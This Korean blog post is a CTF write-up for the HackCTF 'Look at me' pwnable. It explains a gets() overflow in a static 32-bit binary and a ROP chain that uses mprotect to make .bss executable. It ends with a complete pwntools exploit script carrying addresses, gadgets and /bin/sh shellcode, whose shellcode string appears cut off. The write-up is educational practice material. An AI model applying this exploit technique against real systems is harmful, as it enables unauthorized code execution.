---
layout: post
title:  "HacCTF look at me write-up"
date:   2020-02-03 19:45:55
image:  hackctf_lookatme.PNG
tags:   [HackCTF]
categories: [Write-up]
---

# [HackCTF] Look at me

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled.png)

PIE가 안걸려있다. 또한 이번 바이너리는 32bit이다.

**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled%201.png)

Hellooooo를 출력하고 입력할수 있는 공간이 나온다. 아무 문자나 입력하면 바로 종료가 되버린다. 이역시 바로 코드를 살펴보자.

**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled%202.png)

메인을 보면 내가 알수 있는 함수는 look_at_me 하나이다. 나머지는 확인을 해봐도 복잡하ㄱ....

look_at_me함수를 봐보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled%203.png)

엄청 단순하다. gets함수를 입력받고 끝난다. ret주소까지 덮을수 있다. 혹시 플래그를 출력해주는 함수가 있는지 아이다에서 찾아보자.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled%204.png)

함수들이 굉장히 많은데, 그 이유는 해당 바이너리를 빌드시 라이브러리들을 동적으로 링킹해준것이 아닌, 정적으로 링킹을 해줬기 때문이다. 따라서 모든 라이브러리들이 다 보이는 것이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled%205.png)

file 명령어로 확인해보면 정적 링킹이 되있다는 사실을 확인 할 수 있다. 하지만 이 많은 라이브러리들 중에 system함수가 존재하지 않는다. 대신, mprotect 함수가 존재한다.

mprotect 함수는 원하는 코드영역의 권한을 변경할 수 있는 함수이다. 다행이 해당 함수가 링킹되어있어서 이를 이용하면 될 것이다.  참고로 mprotect 함수는 아래처럼 생겼는데

    mprotect(원하는 주소, 사이즈, 권한)

여기서 원하는 주소 → 이부분은 0x1000의 배수가 되야한다. mmap에서 메모리를 할당할때 해당 크기만큼 할당해주기 때문이라 한다.

### 2. 접근방법

---

스택 영역은 aslr 때문에 주소를 구하기가 귀찮음으로 .bss 영역을 이용하자. 왜냐하면 해당 영역은 aslr이 걸려있어도 주소가 고정으로 세팅되어있기 때문이다.

따라서 ROP를 이용하여 .bss 영역에 쉘코드를 삽입하여 실행시키는 루틴으로 작업하면 된다. 대충 흐름은 다음처럼 구성하면 된다.

    1. ebp까지 더미값 채우기
    
    2. ret에 gets함수 넣기
    
    3. ret + 4에 가젯 -> pop ret -> 0x08048433
    
    4. ret + 8에 bss 주소 넣기 -> 0x080eaf80
    
    5. ret + 12에 mprotect 함수 주소 넣기 -> 0x0806e0f0
    
    6. ret + 16에 가젯 -> pop pop pop ret -> 0x080483c8
    
    7. ret + 24에 7 -> 권한
    
    8. ret + 28에 3000 -> 사이즈
    
    9. ret + 32에 bss_start 주소 -> 0x080ea000
    
    10. ret + 36에 bss주소 -> 0x080eaf80

요렇게 말이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Look%20at%20me/Untitled%206.png)

또한 참고로 mprotect 의 첫번째 인자인 주소가 0x1000의 배수가 되야 한다고 했으므로, .bss 시작주소를 인자로 주고 사이즈를 10000정도 크게 주면, 해당 범위 아무곳에 쉘코드를 집어넣으면 편하다

### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    p=remote("ctf.j0n9hyun.xyz",3017)
    #p=process("./lookatme",aslr=False)
    #gdb.attach(p,""" b* 0x0804889E """)
    
    gets_addr=p32(0x804f120)
    pr=p32(0x08048433)
    bss=p32(0x080eaf80)
    mprotect_addr=p32(0x0806e0f0)
    pppr = p32(0x0806f028)
    rwx=p32(7)
    size=p32(10000)
    bss_start=p32(0x080ea000)
    
    shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\$
    payload = "A"*28
    payload +=gets_addr
    payload +=pr
    payload +=bss
    payload +=mprotect_addr
    payload +=pppr
    payload +=bss_start
    payload +=size
    payload +=rwx
    payload +=bss
    
    p.sendlineafter("Hellooooooooooooooooooooo\n",payload)
    
    p.sendline(shellcode)
    
    p.interactive()

### 4. 몰랐던 개념

---

- mprotect 함수를 이용한 ROP